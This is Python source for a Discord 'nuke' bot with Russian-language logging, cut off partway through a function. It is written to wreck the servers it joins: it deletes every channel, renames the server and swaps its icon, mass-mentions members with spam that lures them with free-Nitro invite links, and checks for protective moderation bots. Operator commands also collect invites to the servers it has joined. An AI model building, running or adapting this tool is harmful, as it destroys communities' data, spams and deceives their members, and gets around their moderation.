import asyncio
import random
import string
from typing import Iterable, Tuple, Iterator, Callable
from aiolimiter import AsyncLimiter
import aiohttp
import requests
from datetime import datetime, timedelta, timezone
import json
from typing_extensions import Optional
import discord
from discord import Guild
from discord import ui, Interaction, SelectOption
from discord.ext import tasks, commands
from discord.utils import oauth_url
from rich.console import Console
from rich.theme import Theme
from rich.table import Table
from rich.box import SIMPLE
import io
import time
from zoneinfo import ZoneInfo
import os 
import logging
import math
import re
from base64 import b64encode 

theme = Theme({
    "success": "bold green",
    "error": "bold red",
    "info": "cyan",
    "warning": "yellow",
    "action": "bold magenta"
})
console = Console(theme=theme)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(name)s: %(message)s'
)
logger = logging.getLogger(__name__)

default_config = {
    "server_name": "__...<<NUК3ED>>...__",
    "icon_path": "icon.png",
    "icon_url": None,
    "channel_name": "nuke3d-bitch",
    "num_channels": 100,
    "role_name": "nuke3d-bitch",
    "num_roles": 45,
    "spam_message": "# @everyone Here you will find the same bot for destruction - https://discord.gg/pon \nThe one who enters the server first will receive __Nitro Full Year AND NUKE BOT__ ----> https://discord.gg/pon / https://youtu.be/kCHLZYXR230?feature=shared",
    "spam_count": 10,
    "template_description": "Template by MSC",
    "sounds_name": "nuke3d",  
    "sounds_amount": 8 
}

REQUESTS_PER_SECOND = 30
limiter = AsyncLimiter(REQUESTS_PER_SECOND, 1)
BOT_START_TIME = time.time()

SAFE_PERMISSIONS = "67377280"
PROTECTED_BOT_NAMES = ["Security", "Wick", "Dyno", "Titanium", "Lavan", "Beemo"]
BOT_TOKEN = ""
PREMIUM_BOT_TOKEN = ""
WEBHOOK_URL = ""
LOG_WEBHOOK_URL = ""
FILES_WEBHOOK_URL = ""
excluded_server_ids = {1191694936723161159}
excluded_server_id = [1191694936723161159]
guild_id = 1191694936723161159
premium_channel_id = 1236748504500539414
ALLOWED_IDS = [1351769806814052372, 854054365534093322, 1247868740549214272, 481097321753477131, 1096355027418894389, 1204777037500387342, 1215100204450316362, 841377664992673826,1215100204450316362]

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.guild_messages = True
intents.integrations = True
intents.dm_messages = True
intents.message_content = True
intents.voice_states = True


bot = commands.AutoShardedBot(command_prefix="!", intents=intents, shard_count=2)  
bot.remove_command('help') 
premium_bot = commands.Bot(command_prefix="!", intents=bot.intents)
premium_bot.remove_command('help') 

lastupdatedate = "26.8.2025"
version = "0.6"
whyadded = f"""**
> Update `{version}` ({lastupdatedate})

```diff
+ Adding commands !token
+ All found bugs have been fixed.
+ The bot has entered the realese version.
```**
"""

user_config = {}
config_authors = {}
temporary_bots = {}
AUTO_NUKE_FILE = "auto_nuke_users.json"
CONFIG_AUTHORS_FILE = "config_authors.json"

def load_auto_nuke_users():
    if not os.path.exists(AUTO_NUKE_FILE):
        console.print(f"[warning]⚠️ Файл {AUTO_NUKE_FILE} не найден, создаём новый...[/]")
        default_data = {"disabled_users": []}
        with open(AUTO_NUKE_FILE, "w") as f:
            json.dump(default_data, f, indent=4)
        return default_data["disabled_users"]
    
    try:
        with open(AUTO_NUKE_FILE, "r") as f:
            data = json.load(f)
        return data["disabled_users"]
    except json.JSONDecodeError:
        console.print(f"[error]❌ Ошибка чтения {AUTO_NUKE_FILE}, создаём новый файл 😿[/]")
        default_data = {"disabled_users": []}
        with open(AUTO_NUKE_FILE, "w") as f:
            json.dump(default_data, f, indent=4)
        return default_data["disabled_users"]

def save_auto_nuke_users(disabled_users):
    data = {"disabled_users": disabled_users}
    with open(AUTO_NUKE_FILE, "w") as f:
        json.dump(data, f, indent=4)
    console.print(f"[success]🎉 Список пользователей авто-нюка сохранён! 💾[/]")

auto_nuke_disabled_users = load_auto_nuke_users()

def load_config_authors():
    try:
        with open(CONFIG_AUTHORS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        console.print(f"[warning]⚠️ Файл {CONFIG_AUTHORS_FILE} не найден, создаём новый...[/]")
        config_authors = {}
        with open(CONFIG_AUTHORS_FILE, "w") as file:
            json.dump(config_authors, file)
        return {}

def save_config_authors(authors):
    with open(CONFIG_AUTHORS_FILE, "w") as file:
        json.dump(authors, file, indent=4)

def load_blacklist():
    try:
        with open('blacklist.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        console.print("[warning]⚠️ Файл blacklist.json не найден, создаём новый...[/]")
        blacklist = []
        with open('blacklist.json', 'w') as file:
            json.dump(blacklist, file)
        return []

def load_server_blacklist():
    try:
        with open('server.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        console.print("[warning]⚠️ Файл server.json не найден, создаём новый...[/]")
        server_blacklist = []
        with open('server.json', 'w') as file:
            json.dump(server_blacklist, file)
        return []

blacklist = load_blacklist()
server_blacklist = load_server_blacklist()

def load_premium_users():
    try:
        with open('premium_users.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        console.print("[warning]⚠️ Файл premium_users.json не найден, создаём новый...[/]")
        with open('premium_users.json', 'w') as file:
            json.dump([], file)
        return []

def save_premium_users(users):
    with open('premium_users.json', 'w') as file:
        json.dump(users, file, indent=4)

premium_users = load_premium_users()

def load_config():
    try:
        with open('config_info.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        with open('config_info.json', 'w') as file:
            json.dump({}, file)
        return {}

def save_config(config):
    with open('config_info.json', 'w') as file:
        json.dump(config, file, indent=4)

def update_server_count(user_id, guild_id):
    try:
        with open('user_server_count.json', 'r') as file:
            user_server_count = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        user_server_count = {}
        console.print(f"[warning]⚠️ Файл user_server_count.json не найден или повреждён, создан новый пустой словарь[/]")

    if str(user_id) not in user_server_count:
        user_server_count[str(user_id)] = []
        console.print(f"[info]📝 Создан новый список серверов для пользователя {user_id}[/]")

    if guild_id not in user_server_count[str(user_id)]:
        user_server_count[str(user_id)].append(guild_id)
        console.print(f"[success]✅ Сервер {guild_id} добавлен в статистику пользователя {user_id}[/]")

    try:
        with open('user_server_count.json', 'w') as file:
            json.dump(user_server_count, file, indent=4)
        console.print(f"[success]✅ Файл user_server_count.json успешно обновлён для пользователя {user_id}[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка при записи в user_server_count.json для пользователя {user_id}: {e}[/]")

    return len(user_server_count[str(user_id)])

def save_temp_bots():
    data = []
    for user_id, info in temporary_bots.items():
        if 'expiration' in info and info['expiration'] > time.time() and 'token' in info:
            data.append({
                "user_id": user_id,
                "token": info['token'],
                "expiration": info['expiration'],
                "message_id": info.get('message_id')
            })
    with open('temp_bots.json', 'w') as f:
        json.dump(data, f)

async def restore_views():
    if os.path.exists('temp_bots.json'):
        with open('temp_bots.json', 'r') as f:
            saved_bots = json.load(f)
        for bot_data in saved_bots:
            user_id = bot_data['user_id']
            message_id = bot_data.get('message_id')
            if message_id:
                config_authors[str(message_id)] = user_id
                bot.add_view(TokenControlView(int(user_id)), message_id=int(message_id))

@bot.command()
async def status(ctx, arg='play', *, text='xenom.gg'):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return   
    if arg == 'stream':
        await bot.change_presence(activity=discord.Streaming(name=text, url='https://twitch.tv/404'))
        embed = discord.Embed(
            title=':heavy_check_mark: | Успешно',
            description=f'> **Статус бота изменён на `Стримит {text}`**',
            colour=discord.Colour.from_rgb(0, 0, 0)
        )
    elif arg == 'play':
        await bot.change_presence(activity=discord.Game(name=text))
        embed = discord.Embed(
            title=':heavy_check_mark: | Успешно',
            description=f'> **Статус бота изменён на `Играет в {text}`**',
            colour=discord.Colour.from_rgb(0, 0, 0)
        )
    elif arg == 'listen':
        await bot.change_presence(activity=discord.Activity(name=text, type=discord.ActivityType.listening))
        embed = discord.Embed(
            title=':heavy_check_mark: | Успешно',
            description=f'> **Статус бота изменён на `Слушает {text}`**',
            colour=discord.Colour.from_rgb(0, 0, 0)
        )
    elif arg == 'competing':
        await bot.change_presence(activity=discord.Activity(name=text, type=discord.ActivityType.competing))
        embed = discord.Embed(
            title=':heavy_check_mark: | Успешно',
            description=f'> **Статус бота изменён на `Соревнуется в {text}`**',
            colour=discord.Colour.from_rgb(0, 0, 0)
        )
    elif arg == 'watch':
        await bot.change_presence(activity=discord.Activity(name=text, type=discord.ActivityType.watching))
        embed = discord.Embed(
            title=':heavy_check_mark: | Успешно',
            description=f'> **Статус бота изменён на `Смотрит {text}`**',
            colour=discord.Colour.from_rgb(0, 0, 0)
        )
    elif arg == 'list':
        embed = discord.Embed(
            title=':video_game: | Список статусов',
            description='''
>>> **stream — `статус "Стримит"`
competing — `статус "Соревнуется"`
listen — `статус "Слушает"`
watch — `статус "Смотрит"`
play — `статус "Играет"`**''',
            colour=discord.Colour.from_rgb(0, 0, 0)
        )
    else:
        embed = discord.Embed(
            title=':x: | Ошибка',
            description='> **Неверный статус**',
            colour=discord.Colour.from_rgb(255, 0, 0)
        )

    await ctx.send(embed=embed)

@bot.command(name='leave', help='Покидает все серверы, на которых находится бот, за исключением указанного сервера.')
async def leave(ctx):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    for guild in bot.guilds:
        if guild.id not in excluded_server_ids:
            try:
                await guild.leave()
                console.print(f"[success]🔥 Бот покинул сервер {guild.name} ({guild.id})! 🚀[/]")
            except discord.errors.Forbidden:
                console.print(f"[error]❌ Не удалось покинуть сервер {guild.name} ({guild.id}), нет прав. 😿[/]")
                pass 

    await ctx.send("Покинул все серверы, за исключением указанного сервера.")
    console.print(f"[success]🎉 Все серверы, кроме {excluded_server_id}, покинуты! 💪[/]")

async def embed(ctx, n, title, array):
    try:
        if not n.isdigit() or (n := int(n) - 1) < 0:
            await ctx.send("❌ Страница не найдена.")
            console.print(f"[error]❌ Неверный номер страницы ({n+1}) для команды {ctx.command} от {ctx.author.name} ({ctx.author.id})[/]")
            return

        per_page = 15
        names = ''
        ids = ''
        item_length = len(array)

        if item_length == 0:
            await ctx.send(f"📜 {title} количество: 0")
            console.print(f"[info]🔍 {title} пуст, ничего не выводим для {ctx.author.name} ({ctx.author.id})[/]")
            return

        init_item = n * per_page
        final_item = init_item + per_page
        if init_item > item_length - per_page:
            if init_item > item_length:
                await ctx.send("❌ Страница не найдена.")
                console.print(f"[error]❌ Страница ({n+1}) превышает максимум для {ctx.command} от {ctx.author.name} ({ctx.author.id})[/]")
                return
            final_item = init_item + (item_length % per_page)
        else:
            final_item = init_item + per_page

        for i in range(init_item, final_item):
            item = array[i]
            item_name = item.name[:17] + '...' if len(item.name) > 17 else item.name
            names += f'{item_name}\n'
            ids += f'{item.id}\n'

        try:
            embed = discord.Embed(
                title=title,
                description=f'Количество: {item_length}',
                color=discord.Colour.from_rgb(0, 0, 0)
            )
            embed.add_field(name='Имя', value=names, inline=True)
            embed.add_field(name='Айди', value=ids, inline=True)
            embed.set_footer(text=f'{n+1}/{math.ceil(item_length / per_page)}')
            await ctx.send(embed=embed)
            console.print(f"[success]✅ Выведен список {title} (страница {n+1}) для {ctx.author.name} ({ctx.author.id})[/]")
        except Exception as e:
            console.print(f"[error]❌ Ошибка при создании embed: {e}[/]")
            names = names.split('\n')
            ids = ids.split('\n')
            fallback = f"```{title}\nКоличество: {item_length}\n{'Имя':<20}{'Айди'}\n" + \
                       "".join(f"{names[i]:<20}{ids[i]}\n" for i in range(len(names)-1)) + \
                       f"{n+1}/{math.ceil(item_length / per_page)}```"
            await ctx.send(fallback)
            console.print(f"[warning]⚠️ Использован текстовый fallback для {title} (страница {n+1})[/]")
    except Exception as e:
        console.print(f"[error]❌ Неизвестная ошибка в embed: {e}[/]")
        await ctx.send("❌ Произошла ошибка при отображении списка.")
        console.print(f"[error]❌ Ошибка при отображении списка для {ctx.author.name} ({ctx.author.id}): {e}[/]")

@bot.command()
async def links(ctx, arg: int = 10):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    console.print(f"[action]🔗 Запуск команды !links для {ctx.author.name} ({ctx.author.id}) с arg={arg}...[/]")

    for guild in bot.guilds:
        if guild.id in excluded_server_ids:
            console.print(f"[info]🔍 Пропущен сервер {guild.name} ({guild.id}), он в excluded_server_ids[/]")
            continue

        try:
            if guild.member_count < arg:
                await guild.leave()
                await ctx.send(f"Покинул сервер {guild.name} ({guild.id} / {guild.member_count} участников) из-за малого онлайна")
                console.print(f"[success]✅ Покинул сервер {guild.name} ({guild.id}) из-за малого онлайна ({guild.member_count} < {arg})[/]")
            else:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite(max_age=0, max_uses=0)
                        await ctx.send(f"Инвайт для {guild.name} ({guild.id}): {invite}")
                        console.print(f"[success]✅ Создан инвайт для {guild.name} ({guild.id}): {invite}[/]")
                        break
                else:
                    await guild.leave()
                    await ctx.send(f"🚪 Покинул сервер {guild.name} ({guild.id} / {guild.member_count} участников) из-за невозможности создать инвайт")
                    console.print(f"[error]❌ Покинул сервер {guild.name} ({guild.id}) из-за невозможности создать инвайт[/]")
        except discord.Forbidden:
            await ctx.send(f"🚪 Покинул сервер {guild.name} ({guild.id} / {guild.member_count} участников) из-за отсутствия прав")
            console.print(f"[error]❌ Покинул сервер {guild.name} ({guild.id}) из-за отсутствия прав[/]")
            try:
                await guild.leave()
            except:
                console.print(f"[error]❌ Не удалось покинуть сервер {guild.name} ({guild.id})[/]")
        except discord.HTTPException as e:
            await ctx.send(f"Ошибка при обработке сервера {guild.name} ({guild.id}): {e}")
            console.print(f"[error]❌ HTTP ошибка при обработке {guild.name} ({guild.id}): {e}[/]")
        except Exception as e:
            await ctx.send(f"Неизвестная ошибка при обработке сервера {guild.name} ({guild.id}): {e}")
            console.print(f"[error]❌ Неизвестная ошибка при обработке {guild.name} ({guild.id}): {e}[/]")

    await ctx.send("Команда !links завершена!")
    console.print(f"[success]🎉 Команда !links завершена для {ctx.author.name} ({ctx.author.id})[/]")

@bot.command()
async def servers(ctx, n: str = '1'):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return
 
    console.print(f"[action]📜 Запуск команды !servers для {ctx.author.name} ({ctx.author.id}) с n={n}...[/]")
    guilds = [guild for guild in bot.guilds if guild.id not in excluded_server_ids]
    await embed(ctx, n, 'Сервера', guilds)

@bot.command()
async def server_info(ctx, *, guildid: int = None):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return
    
    console.print(f"[action]🔍 Запуск команды !server_info для {ctx.author.name} ({ctx.author.id}) с guildid={guildid}...[/]")

    if guildid is None:
        e = discord.Embed(title=':x: Ошибка!', description='Вы не ввели ID сервера.', colour=discord.Colour.from_rgb(0, 0, 0))
        await ctx.send(embed=e)
        console.print(f"[error]❌ Не указан guildid для !server_info от {ctx.author.name} ({ctx.author.id})[/]")
        return

    guild = bot.get_guild(guildid)
    if guild is None:
        e = discord.Embed(title=':x: Ошибка!', description='Введён неверный ID сервера.', colour=discord.Colour.from_rgb(0, 0, 0))
        await ctx.send(embed=e)
        console.print(f"[error]❌ Неверный guildid ({guildid}) для !server_info от {ctx.author.name} ({ctx.author.id})[/]")
        return

    try:
        members = sum(1 for member in guild.members if not member.bot)
        bots = sum(1 for member in guild.members if member.bot)
        allmembers = guild.member_count
        textchannels = len(guild.text_channels)
        vcchannels = len(guild.voice_channels)
        categories = len(guild.categories)
        allchannels = len(guild.channels)
        roles = len(guild.roles)
        emojis = len(guild.emojis)

        invite = None
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                invite = await channel.create_invite(max_age=0, max_uses=0)
                break
        invite_url = invite.url if invite else "Не удалось создать ссылку"

        e = discord.Embed(
            color=discord.Colour.from_rgb(0, 0, 0),
            title='Информация о сервере:',
            description=f'''Владелец: `{guild.owner}`
Айди владельца: `{guild.owner.id}`
Сервер: `{guild.name}`
Айди сервера: `{guild.id}`
Дата создания: `{guild.created_at.strftime('%d.%m.%Y %H:%M')}`
Ссылка: {f'[Клик]({invite_url})' if invite else 'Недоступна'}'''
        )
        e.add_field(
            name='Каналов:',
            value=f'''Всего: `{allchannels}`
Текстовых: `{textchannels}`
Голосовых: `{vcchannels}`
Категорий: `{categories}`''',
            inline=False
        )
        e.add_field(name='Ролей:', value=f'`{roles}`', inline=False)
        e.add_field(name='Эмодзи:', value=f'`{emojis}`', inline=False)
        e.add_field(
            name='Участников:',
            value=f'''Всего: `{allmembers}`
Пользователей: `{members}`
Ботов: `{bots}`''',
            inline=False
        )

        if guild.icon:
            e.set_thumbnail(url=guild.icon.url)

        await ctx.send(embed=e)
        console.print(f"[success]✅ Информация о сервере {guild.name} ({guild.id}) отправлена для {ctx.author.name} ({ctx.author.id})[/]")
    except discord.Forbidden:
        e = discord.Embed(title=':x: Ошибка!', description='Нет прав для создания инвайта или доступа к данным сервера.', colour=discord.Colour.from_rgb(0, 0, 0))
        await ctx.send(embed=e)
        console.print(f"[error]❌ Нет прав для !server_info на сервере {guildid} от {ctx.author.name} ({ctx.author.id})[/]")
    except Exception as e:
        e = discord.Embed(title=':x: Ошибка!', description=f'Произошла ошибка: {e}', colour=discord.Colour.from_rgb(0, 0, 0))
        await ctx.send(embed=e)
        console.print(f"[error]❌ Неизвестная ошибка в !server_info для {guildid}: {e}[/]")
                  
@bot.command(name='addblacklist')
async def addblacklist(ctx, member_id: int):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    if member_id not in blacklist:
        blacklist.append(member_id)
        with open('blacklist.json', 'w') as file:
            json.dump(blacklist, file)
        await ctx.send(f"Пользователь с идентификатором {member_id} был добавлен в черный список.")
        console.print(f"[success]🔥 Пользователь {member_id} добавлен в blacklist! 💪[/]")
    else:
        await ctx.send(f"Пользователь с идентификатором {member_id} уже находится в черном списке.")
        console.print(f"[warning]⚠️ Пользователь {member_id} уже в blacklist, не добавляем. 🚫[/]")

@bot.command(name='removeblacklist')
async def removeblacklist(ctx, member_id: int):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    if member_id in blacklist:
        blacklist.remove(member_id)
        with open('blacklist.json', 'w') as file:
            json.dump(blacklist, file)
        await ctx.send(f"Пользователь с идентификатором {member_id} был удален из черного списка.")
        console.print(f"[success]🔥 Пользователь {member_id} удалён из blacklist! 🚀[/]")
    else:
        await ctx.send(f"Пользователя с идентификатором {member_id} нет в черном списке.")
        console.print(f"[error]🤔 Пользователь {member_id} не найден в blacklist. 🚫[/]")

@bot.command(name='addserverblacklist')
async def addserverblacklist(ctx, server_id: int):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    if server_id not in server_blacklist:
        server_blacklist.append(server_id)
        with open('server.json', 'w') as file:
            json.dump(server_blacklist, file)
        await ctx.send(f"Сервер с идентификатором {server_id} был добавлен в черный список серверов.")
        console.print(f"[success]🔥 Сервер {server_id} добавлен в server_blacklist! 💪[/]")
        log_message(f"Сервер с идентификатором {server_id} был добавлен в черный список серверов.")
    else:
        await ctx.send(f"Сервер с идентификатором {server_id} уже находится в черном списке сервера.")
        console.print(f"[warning]⚠️ Сервер {server_id} уже в server_blacklist, не добавляем. 🚫[/]")

@bot.command(name='removeserverblacklist')
async def removeserverblacklist(ctx, server_id: int):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return

    if server_id in server_blacklist:
        server_blacklist.remove(server_id)
        with open('server.json', 'w') as file:
            json.dump(server_blacklist, file)
        await ctx.send(f"Сервер с идентификатором {server_id} был удален из черного списка серверов.")
        console.print(f"[success]🔥 Сервер {server_id} удалён из server_blacklist! 🚀[/]")
        log_message(f"Сервер с идентификатором {server_id} был удален из черного списка серверов.")
    else:
        await ctx.send(f"Сервер с идентификатором {server_id} не найден в черном списке сервера.")
        console.print(f"[error]🤔 Сервер {server_id} не найден в server_blacklist. 🚫[/]")

@bot.command(name='serverblacklist')
async def serverblacklist(ctx):
    if ctx.author.id not in ALLOWED_IDS:
        await ctx.send("У вас нет разрешения на использование этой команды.")
        return
    
    if server_blacklist:
        blacklist_str = '\n'.join(str(server_id) for server_id in server_blacklist)
        server_count = len(server_blacklist)
        
        embed = discord.Embed(title="Серверы в черном списке", color=discord.Color.red()) 
        embed.add_field(name="ID серверов", value=blacklist_str, inline=False)
        embed.add_field(name="Количество серверов", value=server_count, inline=False)
        
        await ctx.send(embed=embed)
        console.print(f"[info]📜 Выведен список server_blacklist: {server_count} серверов. 🔍[/]")
    else:
        await ctx.send("Серверы в черном списке отсутствуют.")
        console.print(f"[info]📜 server_blacklist пуст, ничего не выводим. 🚫[/]")

@bot.before_invoke
async def check_blacklist(ctx):
    if ctx.guild is None:
        return False
    
    if ctx.author.id in blacklist:
        await ctx.send("Вам не разрешается использовать этого бота.")
        console.print(f"[error]❌ {ctx.author.name} ({ctx.author.id}) в blacklist, доступ запрещён! 😿[/]")
        raise commands.CheckFailure()
    
    if ctx.guild.id in server_blacklist:
        await ctx.send("Эта команда не может быть использована на данном сервере.")
        console.print(f"[error]❌ Сервер {ctx.guild.name} ({ctx.guild.id}) в server_blacklist, команда запрещена! 😿[/]")
        raise commands.CheckFailure()
    
def random_rgb():
    return random.randint(0, 0xFFFFFF)

def random_string(length: int = 10) -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def log_message(message):
    console.print(message)

def _shuffle_array(array: Iterable) -> Tuple[Iterator, Iterator]:
    array_iterator = iter(array)
    array_positions = [i + 1 for i in range(len(array))]
    random.shuffle(array_positions)
    array_positions = iter(array_positions)
    return array_iterator, array_positions

async def check_permissions(guild: Guild) -> bool:
    me = guild.me
    permissions = me.guild_permissions
    required = [
        ("manage_channels", permissions.manage_channels),
        ("manage_roles", permissions.manage_roles),
        ("send_messages", permissions.send_messages),
        ("manage_guild", permissions.manage_guild),
        ("view_audit_log", permissions.view_audit_log),
        ("read_messages", permissions.read_messages)
    ]
    missing = [perm for perm, has in required if not has]
    if missing:
        console.print(f"[error]❌ Отсутствуют права: {', '.join(missing)}[/]")
        return False
    console.print("[success]✅ Все необходимые права присутствуют[/]")
    return True

async def detect_protected_bots(guild: Guild) -> bool:
    for member in guild.members:
        if member.bot and any(name.lower() in member.name.lower() for name in PROTECTED_BOT_NAMES):
            console.print(f"[warning]⚠️ Обнаружен защитный бот: {member.name} ({member.id})[/]")
            return True
    console.print("[info]🔍 Защитные боты не обнаружены[/]")
    return False

async def request(
    method: str,
    url: str,
    payload: dict = None,
    headers: dict = None,
    timeout: Optional[float] = 10,
    retries: int = 6
):
    headers = headers or {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
    for attempt in range(retries):
        try:
            async with aiohttp.ClientSession() as session:
                async with limiter:
                    kwargs = {'headers': headers, 'timeout': aiohttp.ClientTimeout(total=timeout)}
                    if payload:
                        kwargs['json'] = payload
                    method_func = getattr(session, method.lower())
                    async with method_func(url, **kwargs) as resp:
                        console.print(f"[info]🔍 HTTP Status: {resp.status} для {url}[/]")
                        if resp.status == 429:
                            retry_after = float(resp.headers.get('X-RateLimit-Reset-After', 1))
                            console.print(f"[warning]⏳ Rate limit, ждем {retry_after:.2f} секунд...[/]")
                            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                            continue
                        if resp.status == 403:
                            console.print(f"[error]❌ Ошибка 403: Недостаточно прав для {url}[/]")
                            return None
                        if resp.status == 404:
                            console.print(f"[warning]⚠️ Ошибка 404: Неверный URL {url}, пропускаем[/]")
                            return None
                        if resp.status >= 200 and resp.status < 300:
                            console.print(f"[success]✅ Успешный запрос: {url}[/]")
                            if resp.content_type == 'application/json':
                                return await resp.json()
                            return resp
                        console.print(f"[error]❌ Ошибка: HTTP {resp.status} для {url}[/]")
                        return None
        except (aiohttp.ClientConnectionError, aiohttp.ClientConnectorDNSError) as e:
            console.print(f"[error]❌ Ошибка соединения: {e} для {url}, повтор через {2 ** attempt} сек...[/]")
            await asyncio.sleep(2 ** attempt + random.uniform(0.1, 0.5))
        except Exception as e:
            console.print(f"[error]❌ Ошибка: {e} для {url}[/]")
            await asyncio.sleep(2 ** attempt + random.uniform(0.1, 0.5))
    console.print(f"[error]❌ Не удалось выполнить запрос после {retries} попыток для {url}[/]")
    return None

async def send_requests(urls: list, method: str, payload: dict = None, get_payload: Callable[[], dict] = None, headers: dict = None):
    if not urls:
        return
    headers = headers or {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
    random.shuffle(urls)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in urls:
            tasks.append(asyncio.create_task(
                request(method, url, get_payload() if get_payload else payload, headers=headers)
            ))
        await asyncio.sleep(random.uniform(0.003, 0.015))
        await asyncio.wait(tasks)

async def get_channels(guild: Guild, headers: dict) -> list:
    url = f'https://discord.com/api/v10/guilds/{guild.id}/channels'
    resp = await request('get', url, headers=headers)
    if resp:
        console.print(f"[success]✅ Получено {len(resp)} каналов для гильдии {guild.name}[/]")
    else:
        console.print(f"[error]❌ Не удалось получить каналы для гильдии {guild.name}[/]")
    return resp if isinstance(resp, list) else []

async def create_server_template(guild: Guild) -> Optional[str]:
    headers = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
    url = f'https://discord.com/api/v10/guilds/{guild.id}/templates'

    templates = await request('get', url, headers=headers)
    if templates and isinstance(templates, list) and len(templates) > 0:
        template_code = templates[0]['code']
        console.print(f"[info]🔍 Найден существующий шаблон: {template_code}, синхронизируем...[/]")
        sync_url = f'https://discord.com/api/v10/guilds/{guild.id}/templates/{template_code}'
        sync_response = await request('put', sync_url, headers=headers)
        if sync_response:
            console.print(f"[success]✅ Шаблон {template_code} синхронизирован[/]")
            return template_code
        console.print(f"[warning]⚠️ Не удалось синхронизировать шаблон, создаем новый...[/]")

    payload = {
        "name": guild.name,
        "description": default_config["template_description"]
    }
    response = await request('post', url, payload=payload, headers=headers)
    if response and 'code' in response:
        console.print(f"[success]✅ Шаблон сервера создан: {response['code']}[/]")
        return response['code']
    console.print(f"[warning]⚠️ Не удалось создать шаблон сервера, продолжаем выполнение...[/]")
    return None

async def send_template_to_inviter(guild: Guild, user):
    template_code = await create_server_template(guild)
    if not template_code:
        console.print("[error]❌ Не удалось отправить шаблон: код шаблона не получен[/]")
        return
    template_url = f"https://discord.new/{template_code}"
    try:
        await user.send(template_url)
        console.print(f"[success]✅ Ссылка на шаблон отправлена в ЛС пользователю {user.name} ({user.id})[/]")
    except discord.Forbidden:
        console.print(f"[error]❌ Не удалось отправить ЛС пользователю {user.name}: запрещено[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка при отправке шаблона: {e}[/]")

async def download_icon(url: str) -> Optional[bytes]:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200 and 'image' in resp.content_type:
                    console.print(f"[success]✅ Иконка загружена с {url}[/]")
                    return await resp.read()
                console.print(f"[error]❌ Неверный тип контента или ошибка загрузки: {resp.status} для {url}[/]")
                return None
    except Exception as e:
        console.print(f"[error]❌ Ошибка загрузки иконки: {e} для {url}[/]")
        return None


async def edit_server(guild: Guild, config: dict):
    console.print("[action]🔧 Редактирование имени и значка сервера...[/]")
    try:
        async with limiter:
            await guild.edit(name=config["server_name"])
            console.print(f"[success]✅ Имя сервера изменено на {config['server_name']}[/]")
        
        if config.get("icon_url"):
            icon_data = await download_icon(config["icon_url"])
            if icon_data:
                async with limiter:
                    await guild.edit(icon=icon_data)
                console.print("[success]✅ Значок сервера изменён по URL[/]")
                return
        
        try:
            with open(config["icon_path"], "rb") as f:
                icon_data = f.read()
                async with limiter:
                    await guild.edit(icon=icon_data)
                console.print(f"[success]✅ Значок сервера изменён из файла {config['icon_path']}[/]")
        except FileNotFoundError:
            console.print(f"[warning]⚠️ Файл {config['icon_path']} не найден, пропускаем изменение иконки[/]")
        except Exception as e:
            console.print(f"[error]❌ Ошибка при загрузке локальной иконки: {e}[/]")
            
    except discord.Forbidden:
        console.print(f"[error]❌ Невозможно отредактировать имя сервера или значок для {guild.name}[/]")
    except discord.HTTPException as e:
        if e.status == 429:
            retry_after = float(e.headers.get('X-RateLimit-Reset-After', 0.5))
            console.print(f"[warning]⏳ Rate limit, ждем {retry_after:.2f} секунд...[/]")
            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
            await edit_server(guild, config)
        else:
            console.print(f"[error]❌ Ошибка при редактировании сервера: {e}[/]")

async def delete_channels(guild: Guild):
    console.print("[action]🗑️ Удаление всех каналов...[/]")
    if not await check_permissions(guild):
        return
    headers = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json'}
    channels = await get_channels(guild, headers)
    urls = [f"https://discord.com/api/v10/channels/{channel['id']}" for channel in channels]
    await send_requests(urls, 'delete', headers=headers)
    tasks = []
    for channel in guild.channels:
        try:
            tasks.append(channel.delete())
        except discord.Forbidden:
            console.print(f"[error]❌ Нет прав для удаления канала {channel.name}[/]")
        except discord.HTTPException as e:
            console.print(f"[warning]⚠️ Ошибка при удалении канала {channel.name}: {e}[/]")
    await asyncio.gather(*tasks, return_exceptions=True)
    console.print("[success]✅ Все каналы удалены[/]")

async def create_event(guild: Guild):
    console.print("[action]🎉 Создание события...[/]")
    try:
        now = datetime.now(ZoneInfo("UTC"))
        if now.year > 2026:
            console.print("[warning]⚠️ Год превышает 2026, событие не создано[/]")
            return
        event_name = "nuke bot -> https://discord.gg/pon"
        event_description = "Резерв -> discord.gg/MheeaPHS25"
